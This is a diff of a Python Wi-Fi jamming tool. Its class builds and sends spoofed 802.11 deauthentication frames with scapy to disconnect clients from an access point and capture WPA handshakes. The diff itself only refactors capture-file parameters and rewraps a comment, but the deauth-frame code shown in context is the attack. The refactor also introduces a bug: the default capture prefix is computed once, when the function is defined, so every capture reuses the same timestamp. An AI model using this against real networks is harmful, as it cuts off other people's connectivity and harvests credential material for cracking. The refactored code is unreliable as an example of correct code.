@@ -28,7 +28,9 @@ class DeauthJammer(object):
         scapy.conf.iface = iface
         scapy.conf.verb = 0  # Non-verbose mode
 
-    def jam(self, targets, packet_count=1, capture_handshake=False, channel=1):
+    def jam(self, targets, packet_count=1, capture_handshake=False, 
+            capture_dir=os.path.abspath(os.path.join(os.path.dirname(__file__), "captures")),
+            capture_prefix="capture_" + str(time.time()), channel=1):
         self._threads_finished = 0
         self._threads = list()
 
@@ -43,11 +45,11 @@ class DeauthJammer(object):
 
         AnalyzrCore.set_channel(scapy.conf.iface, channel)
 
-        proc = None
-        capture_prefix = "capture_" + str(time.time())
-        capture_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), "captures"))
         capture_filename = os.path.join(capture_dir, capture_prefix)
+
         capture_actual_filename = capture_filename + "-01.cap"
+
+        proc = None
 
         try:
             os.mkdir(capture_dir)
@@ -96,7 +98,8 @@ class DeauthJammer(object):
             self._on_end()
 
     def _deauth_target(self, target, packet_count):
-        # This also works with subtype 10, "Disassociation-Frame", verified with MBP running 10.12.4
+        # This also works with subtype 10, "Disassociation-Frame", verified
+        # with MBP running 10.12.4
         ap_to_client_pckt = scapy.RadioTap() / scapy.Dot11(type=0, subtype=12, addr1=target, addr2=self._ap_bssid,
                                                            addr3=self._ap_bssid) / scapy.Dot11Deauth(reason=1)
 
